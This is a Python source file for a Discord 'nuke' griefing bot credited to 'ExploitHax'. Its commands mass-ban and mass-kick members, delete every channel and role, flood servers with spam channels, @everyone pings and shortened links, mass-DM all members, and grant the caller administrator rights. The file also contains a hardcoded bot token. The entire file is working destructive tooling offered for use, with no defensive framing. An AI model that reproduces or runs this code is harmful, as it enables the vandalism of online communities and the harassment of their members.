print("Welcome to the  novafucker\n")
import os
import colorama
from colorama import Fore
import discord
import asyncio
import keep_alive
from discord.ext import commands

intents = discord.Intents.default()
intents.members = True

###########SETUP###############
                                               
token = "ODExODk4NjcxMjMwNDg0NTIw.YC45jw.OMS7fYSUo72tFws2Vjuxciw-SxE"                                           #
spam_messages = "!!(Hey)! @everyone Hacked By E̢̢̻ͮͧͦ͋͞͡x͕͕͚͍̿̆͂͞p͔͔͚͉̬̋ͩ̾͗l͖͖̰̝ͭ̀͘o͙͙̙̘̙ͤͫ͞i̧̻̻͉̜͑ͪ̾͟t͖͖̠̬͛H͇͇̹͊ͪ́̕ͅa͔͔̜̗̦ͩ̅̎x͕͕͚͍̿̆͂͞-  | https://bit.ly/ExploitHax| http://bit.ly/2Nhjwuq |   https://dsc.gg/novagriefing | https://tenor.com/view/explosion-boom-explode-gif-17383346 |"         #
massdm = "!(Hey)! @everyone Hacked By E̢̢̻ͮͧͦ͋͞͡x͕͕͚͍̿̆͂͞p͔͔͚͉̬̋ͩ̾͗l͖͖̰̝ͭ̀͘o͙͙̙̘̙ͤͫ͞i̧̻̻͉̜͑ͪ̾͟t͖͖̠̬͛H͇͇̹͊ͪ́̕ͅa͔͔̜̗̦ͩ̅̎x͕͕͚͍̿̆͂͞-  | https://bit.ly/ExploitHax | http://bit.ly/2Nhjwuq |   https://dsc.gg/novagriefing | https://tenor.com/view/explosion-boom-explode-gif-17383346 |"                    #
rolenames = "Grief-By-ExploitHax"         #                                                            
channels = "E̢̢̻ͮͧͦ͋͞͡x͕͕͚͍̿̆͂͞p͔͔͚͉̬̋ͩ̾͗l͖͖̰̝ͭ̀͘o͙͙̙̘̙ͤͫ͞i̧̻̻͉̜͑ͪ̾͟t͖͖̠̬͛H͇͇̹͊ͪ́̕ͅa͔͔̜̗̦ͩ̅̎x͕͕͚͍̿̆͂͞-destroyed-all-with-the-exeplotion " #
##############################

def Clear():
    os.system('cls')


bot = commands.Bot(command_prefix='!')
bot.remove_command("help")


os.system('cls' if os.name == 'nt' else 'clear')
@bot.event
async def on_ready():
    Clear()

    print(f'''{Fore.CYAN}
▓█████▄ ▓█████   ██████ ▄▄▄█████▓ ██▀███   ▒█████ ▓██   ██▓▓█████ ▓█████▄    
▒██▀ ██▌▓█   ▀ ▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒▒██  ██▒▓█   ▀ ▒██▀ ██▌   
░██   █▌▒███   ░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒ ▒██ ██░▒███   ░██   █▌   
░▓█▄   ▌▒▓█  ▄   ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░ ░ ▐██▓░▒▓█  ▄ ░▓█▄   ▌   
░▒████▓ ░▒████▒▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░ ░ ██▒▓░░▒████▒░▒████▓    
 ▒▒▓  ▒ ░░ ▒░ ░▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░   ██▒▒▒ ░░ ▒░ ░ ▒▒▓  ▒    
 ░ ▒  ▒  ░ ░  ░░ ░▒  ░ ░    ░      ░▒ ░ ▒░  ░ ▒ ▒░ ▓██ ░▒░  ░ ░  ░ ░ ▒  ▒    
 ░ ░  ░    ░   ░  ░  ░    ░        ░░   ░ ░ ░ ░ ▒  ▒ ▒ ░░     ░    ░ ░  ░    
   ░       ░  ░      ░              ░         ░ ░  ░ ░        ░  ░   ░       
 ░                                                 ░ ░            
   Create  By >  https://bit.ly/ExploitHa 

                         
    ''' + Fore.RESET)

    await bot.change_presence(activity=discord.Game(name="ExploitHax"))

@bot.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))


#help commamd

@bot.command()
async def help(ctx):
    user = ctx.author
    embed = discord.Embed(
        title="Help Menu Nuke  Nova Fucker",
        description=""
        "```!a Create an administrator role and give it to you;```\n"
        "```!text creates and quantity of user-defined text channels;```\n"
        "```!voice Create and quantity of user-defined voice channels;```\n"
        "```!role Create and quantity of user-defined role channels;```\n"
        "```!nuke Delete all server rooms and create channels that ban all spam pings;```\n"
        "```!spam Spam in all invisible @everyone channels;```\n"
        "```stop to stop spam, type stop;```\n"
        "```!name change the name of the server of your choice;```\n"
        "```!delroles delete all roles;```\n"
        "```!ping ping spam the server;```\n"
        "```!banall ban everyone from the server;```\n"
        "```!kickall kick everyone from the server;```\n"
        "```!massdm send dm to the whole server;```\n"
        "```!delchannels delete all channels;```\n",
        colour=discord.Colour.dark_orange()
    )
    await user.send(embed=embed)
    await ctx.send(f"{ctx.message.author.mention} Commands sent in DM")
#commands  

@bot.command()
async def spam(ctx):
    """Spam messages in all channels."""
    await ctx.message.delete()
    await ctx.send('**Spamming initiated!**', delete_after=1)
    def check_reply(m):
        return m.content == 'stop' and m.author == ctx.author

    async def spam_text():
        while True:
            for tc in ctx.guild.text_channels:
                await tc.send('!(Hey)! @everyone Hacked By E̢̢̻ͮͧͦ͋͞͡x͕͕͚͍̿̆͂͞p͔͔͚͉̬̋ͩ̾͗l͖͖̰̝ͭ̀͘o͙͙̙̘̙ͤͫ͞i̧̻̻͉̜͑ͪ̾͟t͖͖̠̬͛H͇͇̹͊ͪ́̕ͅa͔͔̜̗̦ͩ̅̎x͕͕͚͍̿̆͂͞-  |https://bit.ly/ExploitHax| http://bit.ly/2Nhjwuq |   https://dsc.gg/novagriefing | https://tenor.com/view/explosion-boom-explode-gif-17383346 |', delete_after=1)
    spam_text_task = bot.loop.create_task(spam_text())
    await bot.wait_for('message', check=check_reply)
    spam_text_task.cancel()
    await ctx.send('**Spamming complete!**', delete_after=1)


@bot.command()
async def banall(ctx): 
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    

@bot.command()
async def kickall(ctx): 
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass    


@bot.command()
async def massdm(ctx, *, message): 
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:  
            await user.send(message)
        except:
            pass
        


  

@bot.command(pass_context=True)
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild

#banning
    print("ENTERING: Banning members")

    for member in list(ctx.message.guild.members):
       try:
           await guild.ban(member)
           print("User" +member.name + "Has Been  Banned")
       except:
           pass
    await ctx.send("`Banned all!`")

#deleting channels
    print("ENTERING: Deleting channels")

    try:
      for channel in ctx.guild.channels:
        await channel.delete()
        print("Channel deleted")
    except:
      pass
      print("Channel could not be deleted")
    
#creating channels

    print("ENTERING: Creating channels")

    try:
      for i in range(100):
        guild = ctx.message.guild
        await guild.create_text_channel(channels)
        print("Channel created")
    except:
      pass
      print("Channel could not be created")
      

        
#deleting roles
    
    print("ENTERING: deleting roles")

    for role in guild.roles:
      try:
        await role.delete()
        print(f"Role: {role} has been deleted")
      except:
        pass
        print(f"Role: {role} could not be deleted")

#creating role

    print("ENTERING: creating roles")

    for i in range(50):
      try:
        await guild.create_role(name=rolenames)
        print("Role has been created")
      except:
        print("Role could not be created")
    print("ENTERING: Spamming messages")

    while True:
      for channel in guild.text_channels:
        await channel.send(spam_messages)


@bot.command()
async def name(ctx, msg=None):
 if msg is not None:
    await ctx.guild.edit(name=msg)
 else:
 	await ctx.send('``what do you want me to change the server name to?``')




@bot.command(pass_context=True)
async def a(ctx):
    guild = ctx.message.guild
    perms = discord.Permissions(8)
    await guild.create_role(name='*', permissions=perms)
    member = ctx.message.author
    role = discord.utils.get(guild.roles, name="*")
    await member.add_roles(role)
    embed = discord.Embed(
    colour = discord.Colour.red()
    )
    embed.add_field(name="User got admin", value=f'{member}')

       

@bot.command(pass_context=True)
async def text(ctx, x):
    guild = ctx.message.guild
    for i in range(int(x)):
        await guild.create_text_channel("E̢̢̻ͮͧͦ͋͞͡x͕͕͚͍̿̆͂͞p͔͔͚͉̬̋ͩ̾͗l͖͖̰̝ͭ̀͘o͙͙̙̘̙ͤͫ͞i̧̻̻͉̜͑ͪ̾͟t͖͖̠̬͛H͇͇̹͊ͪ́̕ͅa͔͔̜̗̦ͩ̅̎x͕͕͚͍̿̆͂͞-destroyed-all-with-the-exeplotion")
    embed = discord.Embed(
    colour = discord.Colour.red()
    )
    embed.add_field(name="Channels created", value=f'{x}')

@bot.command(pass_context=True)
async def voice(ctx, x):
    guild = ctx.message.guild
    for i in range(int(x)):
        await guild.create_voice_channel("E̢̢̻ͮͧͦ͋͞͡x͕͕͚͍̿̆͂͞p͔͔͚͉̬̋ͩ̾͗l͖͖̰̝ͭ̀͘o͙͙̙̘̙ͤͫ͞i̧̻̻͉̜͑ͪ̾͟t͖͖̠̬͛H͇͇̹͊ͪ́̕ͅa͔͔̜̗̦ͩ̅̎x͕͕͚͍̿̆͂͞-destroyed-all-with-the-exeplotion")
    embed = discord.Embed(
    colour = discord.Colour.red()
    )
    embed.add_field(name="Channels created", value=f'{x}')



@bot.command(pass_context=True)
async def role(ctx, x):
    guild = ctx.message.guild
    perms = discord.Permissions(8)
    for i in range(int(x)):
        await guild.create_role(name="Grief-By-ExploitHax", permissions=perms)
    embed = discord.Embed(
    colour = discord.Colour.red()
    )
    embed.add_field(name="Roles created", value=f'{x}')




@bot.command()
async def ping(ctx):
    """Spam messages in all channels."""
    await ctx.message.delete()
    await ctx.send('**Spamming initiated!**', delete_after=1)
    def check_reply(m):
        return m.content == 'stop' and m.author == ctx.author

    async def spam_text():
        while True:
            for tc in ctx.guild.text_channels:
                await tc.send('!(Hey)! @everyone Hacked By E̢̢̻ͮͧͦ͋͞͡x͕͕͚͍̿̆͂͞p͔͔͚͉̬̋ͩ̾͗l͖͖̰̝ͭ̀͘o͙͙̙̘̙ͤͫ͞i̧̻̻͉̜͑ͪ̾͟t͖͖̠̬͛H͇͇̹͊ͪ́̕ͅa͔͔̜̗̦ͩ̅̎x͕͕͚͍̿̆͂͞-  https://bit.ly/ExploitHax | http://bit.ly/2Nhjwuq |   https://dsc.gg/novagriefing | https://tenor.com/view/explosion-boom-explode-gif-17383346 |', delete_after=1)
    spam_text_task = bot.loop.create_task(spam_text())
    await bot.wait_for('message', check=check_reply)
    spam_text_task.cancel()
    await ctx.send('**Spamming complete!**', delete_after=1)








@bot.command()
async def delchannels(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return



@bot.command() 
async def delroles(ctx): # b'\xfc'
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass



@bot.command()
async def icon(ctx):
    with open('image.png', 'rb') as f:
        icon = f.read()
    await ctx.guild.edit(icon=icon)






keep_alive.keep_alive()
secret_token = os.getenv("TOKEN")
bot.run(secret_token)